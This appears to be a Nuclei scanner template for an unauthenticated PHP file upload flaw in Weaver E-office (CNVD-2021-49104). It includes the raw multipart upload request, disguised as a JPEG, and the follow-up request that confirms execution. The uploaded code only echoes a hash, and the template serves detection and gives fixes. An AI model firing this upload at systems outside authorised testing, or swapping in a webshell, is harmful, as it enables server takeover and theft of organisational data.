id: CNVD-2021-49104

info:
  name: 泛微 E-office 任意文件上传漏洞（CNVD-2021-49104）
  author: pikpikcu
  severity: critical
  description: |
    泛微 E-office 的 logo 上传接口鉴权和文件类型校验不足，攻击者可上传可执行 PHP 文件并访问执行。模板上传包含随机 MD5 输出的 PHP 文件，再访问上传路径验证代码执行。
  impact: |
    - 攻击者可写入 WebShell 并控制 E-office 应用服务器。
    - OA 系统中的组织架构、流程、附件和集成凭据可能被窃取或篡改。
  remediation: |
    - 升级泛微 E-office 至修复版本，修复 `UploadFile.php` 的鉴权和文件类型校验。
    - 上传文件应存储在不可执行目录，并使用服务端生成文件名和严格 MIME/扩展名校验。
    - 排查 `/images/logo/` 等上传目录中的可疑脚本，清理后轮换相关凭据。
  reference:
    - https://chowdera.com/2021/12/202112200602130067.html
    - http://v10.e-office.cn
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L
    cvss-score: 9.9
    cwe-id: CWE-434
  metadata:
    max-request: 2
  tags: cnvd2021,cnvd,pan,micro,fileupload,intrusive,vuln

variables:
  string: "{{randstr}}"

http:
  - raw:
      - |
        POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4

        --e64bdf16c554bbc109cecef6451c26a4
        Content-Disposition: form-data; name="Filedata"; filename="{{randstr}}.php"
        Content-Type: image/jpeg

        <?php echo md5("{{string}}");?>

        --e64bdf16c554bbc109cecef6451c26a4--
      - |
        GET /images/logo/logo-eoffice.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '{{md5(string)}}'
      - type: word
        part: body
        words:
          - "94d01a2324ce38a2e29a629c54190f67"

      - type: status
        status:
          - 200
